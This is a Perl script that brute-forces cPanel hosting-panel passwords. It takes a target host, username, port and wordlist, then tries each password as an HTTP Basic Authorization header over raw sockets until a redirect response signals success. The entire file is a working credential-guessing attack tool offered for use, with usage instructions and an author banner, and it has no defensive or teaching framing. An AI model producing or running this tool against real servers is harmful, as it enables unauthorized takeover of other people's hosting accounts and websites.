#!/usr/bin/perl 
# Cpanel Password Brute Forcer 
# ---------------------------- 
#    Coded By Imad'Ox Hunter
# Perl Hacking Tools Coder
# Contact http://fb.com/imad.elouajib
# or      imadelouajib@gmail.com
use IO::Socket; 
use LWP::Simple; 
use MIME::Base64; 
 
$host     = $ARGV[0]; 
$user     = $ARGV[1]; 
$port     = $ARGV[2]; 
$list     = $ARGV[3]; 
$file     = $ARGV[4]; 
$url = "http://".$host.":".$port; 
if(@ARGV < 3){ 
print q( 

*:*:*:*:*:*: Cpanel Password Brute Forcer :*:*:*:*:*:*:*:*:*:*
 
--+ Usage   : cpanel.pl [HOST] [User] [PORT][Wordlist] [Save Wordlist] +--
--+ Example : cpanel.pl localhost admin 2082 Wordlist.lst cracked.txt  +--

Explication :
HOST          => TARGET HOST
USER 	      => USERNAME
PORT          => THE CPANEL PORT
LIST          => WORDLITS FILE
SAVE WORDLIST => FILE TO SAVE THE WORDLIST

*:*:*:*:*:*:   Coded By Imad'Ox Hunter   :*:*:*:*:*:*:*:*:*:*
);exit;} 
 
headx(); 
 
$numstart  = "-1"; 
 
sub headx() { 
print q( 
 
+:+:+:+:+:+:+:+:+:+: Cpanel Password Brute Force Tool :+:+:+:+:+:
:+:+:+:+:+:+:+:+:+         Coded By Imad'Ox Hunter    +:+:+:+:+:+ 
 
); 
open (PASSFILE, "<$list") || die "[-] Wordlist Not Found !"; 
@PASSWORDS = <PASSFILE>; 
close PASSFILE; 
foreach my $P (@PASSWORDS) { 
chomp $P; 
$passwd = $P; 
print " 
[~] Try Password : $passwd 
"; 
&brut; 
}; 
} 
sub brut() { 
$authx = encode_base64($user.":".$passwd); 
print $authx; 
my $sock = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print " 
[-] Can't Connect To The Target Host o.O "; 
print $sock "GET / HTTP/1.1 
"; 
print $sock "Authorization: Basic $authx 
"; 
print $sock "Connection: Close 
 
"; 
read  $sock, $answer, 128; 
close($sock); 
 
if ($answer =~ /Moved/) { 
print " 
[~] PASSWORD FOUND :D : $passwd 
"; 
exit(); 
} 
}  